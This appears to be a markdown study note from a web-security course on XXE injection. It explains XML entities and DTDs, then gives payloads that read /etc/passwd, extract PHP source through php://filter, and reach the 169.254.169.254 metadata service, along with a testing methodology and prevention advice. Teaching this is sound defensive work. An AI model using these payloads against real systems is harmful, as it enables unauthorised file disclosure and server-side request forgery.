

```markdown
# XML External Entity (XXE) Injection

## What is XXE?

XML External Entity (XXE) Injection occurs when an application parses XML input that contains a reference to an external entity without proper restrictions. This allows attackers to:

- Read local files from the server
- Perform Server-Side Request Forgery (SSRF)
- Cause Denial of Service (DoS)
- In some cases, achieve Remote Code Execution (RCE)

XXE is listed in the **OWASP Top 10**.

---

## XML Basics

XML (Extensible Markup Language) is used for structured data storage and transfer.

**Example:**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<email>
  <date>01-01-2022</date>
  <sender>john@example.com</sender>
  <body>Hello</body>
</email>
```

### Key Components

| Term        | Description                              | Example                          |
|-------------|------------------------------------------|----------------------------------|
| Tag         | Element name wrapped in `<>`             | `<date>`                         |
| Entity      | Variable-like reference                  | `&lt;`                           |
| Element     | Content between start and end tags       | `<date>01-01-2022</date>`        |
| Attribute   | Extra information inside a tag           | `version="1.0"`                  |
| Declaration | First line of XML                        | `<?xml version="1.0"?>`          |

---

## Document Type Definition (DTD)

A DTD defines the structure of an XML document. It can be internal or external.

**Internal DTD Example:**

```xml
<!DOCTYPE email [
  <!ELEMENT email (date, sender, body)>
  <!ELEMENT date (#PCDATA)>
]>
```

---

## XML Entities

Entities act as variables in XML.

**Internal Entity:**
```xml
<!ENTITY company "Inlane Freight">
```

**External Entity (Core of XXE):**
```xml
<!ENTITY xxe SYSTEM "file:///etc/passwd">
```

When the entity is referenced (`&xxe;`), the parser fetches the content of the external resource.

---

## XXE Exploitation Techniques

### 1. Basic Local File Disclosure

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

### 2. Reading PHP Source Code (Base64 Filter)

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
```

### 3. SSRF via XXE

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
```

### 4. Advanced Techniques

| Technique              | When to Use                              |
|------------------------|------------------------------------------|
| **CDATA + Parameter Entities** | When file contains special characters   |
| **Error-Based XXE**    | When there is no reflected output        |
| **Blind OOB XXE**      | Fully blind (no output + no errors)      |

---

## Testing Methodology

1. Find an endpoint that accepts XML input
2. Confirm entity injection with a simple internal entity
3. Escalate to external entity (`file://` or `http://`)
4. Use `php://filter` for source code if needed
5. Try advanced techniques (CDATA / Error-based / OOB) if basic methods fail

---

## Prevention

- Disable external entities and DTDs in the XML parser
- Keep XML libraries up to date
- Prefer JSON over XML when possible
- Disable detailed error messages in production
- Use a Web Application Firewall (WAF) as an additional layer

---

## Labs in this Section

- [Exploiting XXE using external entities to retrieve files](01-Exploiting-XEE-to-retrive-files.md)
- [Exploiting XXE to perform SSRF attacks](Exploiting-XXE-to-perform-SSRF-attacks.md)
```

